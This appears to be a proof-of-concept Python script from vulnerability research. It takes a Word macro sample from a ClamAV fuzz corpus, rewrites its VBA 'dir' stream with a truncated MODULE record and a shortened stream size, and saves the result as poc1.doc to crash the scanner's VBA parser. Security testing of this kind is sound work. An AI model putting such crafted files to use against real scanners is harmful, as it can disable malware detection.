import struct, pathlib, shutil
p=pathlib.Path('repo-vul/src-vul/clamav-fuzz-corpus/scantype/OLE2/Hello.Macro.Word97-2004.doc')
data=bytearray(p.read_bytes())
hdr=data[:512]
sec_size=1<<struct.unpack_from('<H',hdr,30)[0]; mini_size=1<<struct.unpack_from('<H',hdr,32)[0]
first_dir=struct.unpack_from('<I',hdr,48)[0]
first_mini_fat=struct.unpack_from('<I',hdr,60)[0]; num_mini_fat=struct.unpack_from('<I',hdr,64)[0]
difat=list(struct.unpack_from('<109I',hdr,76)); fat_secs=[x for x in difat if x not in (0xffffffff,0xfffffffe)]
def sec_off(s): return 512+s*sec_size
fat=[]
for s in fat_secs:
    fat += list(struct.unpack('<%dI'%(sec_size//4), data[sec_off(s):sec_off(s)+sec_size]))
def chain(table,start,maxn=10000):
    out=[]; s=start
    while s not in (0xfffffffe,0xffffffff) and len(out)<maxn:
        out.append(s); s=table[s]
    return out
# mini fat
minifat=[]
for s in chain(fat, first_mini_fat, num_mini_fat):
    minifat += list(struct.unpack('<%dI'%(sec_size//4), data[sec_off(s):sec_off(s)+sec_size]))
# dir entries
dir_secs=chain(fat,first_dir)
dir_bytes=bytearray(b''.join(data[sec_off(s):sec_off(s)+sec_size] for s in dir_secs))
entries={}
for i in range(0,len(dir_bytes),128):
    e=dir_bytes[i:i+128]; nl=struct.unpack_from('<H',e,64)[0]
    name=e[:nl-2].decode('utf-16le','ignore') if nl>=2 else ''
    typ=e[66]; start=struct.unpack_from('<I',e,116)[0]; size=struct.unpack_from('<Q',e,120)[0]
    if name: entries[name]=(i//128, typ, start, size)
print('entries dir/root', entries['dir'], entries['Root Entry'])
# build mini stream bytes
root_start=entries['Root Entry'][2]
root_chain=chain(fat, root_start)
mini_stream=bytearray(b''.join(data[sec_off(s):sec_off(s)+sec_size] for s in root_chain))
# extract old dir comp
idx,typ,dir_start,dir_size=entries['dir']
mini_chain=chain(minifat,dir_start)
old=bytearray().join(mini_stream[s*mini_size:(s+1)*mini_size] for s in mini_chain)[:dir_size]
print('mini chain len',len(mini_chain),'old comp len',len(old),'first',old[:20].hex())
# simple inflate simulation of old first bytes?
def make_comp(lit):
    out=bytearray(b'\x01\x00\x00')
    for i in range(0,len(lit),8):
        out.append(0)
        out += lit[i:i+8]
    return bytes(out)
# dir decompressed malicious: PROJECTCODEPAGE maybe, MODULE with size 1 and one byte name, then truncated no unicode id
lit=bytearray()
def rec(id, payload):
    lit.extend(struct.pack('<HI',id,len(payload))); lit.extend(payload)
# Use PROJECTCODEPAGE so codepage set benign
rec(0x0003, struct.pack('<H',1252))
# PROJECTMODULES and cookie optional? Maybe not needed; direct module record allowed in switch.
rec(0x0019, b'A')
comp=make_comp(lit)
print('lit len',len(lit),lit.hex(),'comp len',len(comp),comp[:40].hex())
# replace bytes in mini_stream sectors, pad to old dir_size with zeros? Stream size remains 684 so inflate reads padding zeros -> more literals maybe after malicious. Need if no crash at line 792? It reads from within data_len if padding decompressed. We need data_len short. cli_vba_inflate reads full stream size bytes from file (incl padding zeros in mini sectors and stream size? actually open extracted file likely exact stream size 684). If comp padded with zeros, decompressed includes padding literals? flag 0 + zeros. Need update directory stream size to comp len so extracted file short. Directory entry size field. Do that. 
# Write comp into mini sectors and zero rest of allocated chain
for j,s in enumerate(mini_chain):
    start=s*mini_size; mini_stream[start:start+mini_size]=b'\x00'*mini_size
for off,b in enumerate(comp):
    s=mini_chain[off//mini_size]; pos=s*mini_size+off%mini_size; mini_stream[pos]=b
# write mini_stream back to root sectors
for off,b in enumerate(mini_stream):
    sec=root_chain[off//sec_size]; pos=sec_off(sec)+off%sec_size; data[pos]=b
# update dir entry stream size to comp len (64-bit)
dir_entry_off=idx*128
struct.pack_into('<Q', dir_bytes, dir_entry_off+120, len(comp))
# write dir_bytes back
for off,b in enumerate(dir_bytes):
    sec=dir_secs[off//sec_size]; pos=sec_off(sec)+off%sec_size; data[pos]=b
out=pathlib.Path('/workspace/poc1.doc'); out.write_bytes(data)
print('wrote',out,len(data))
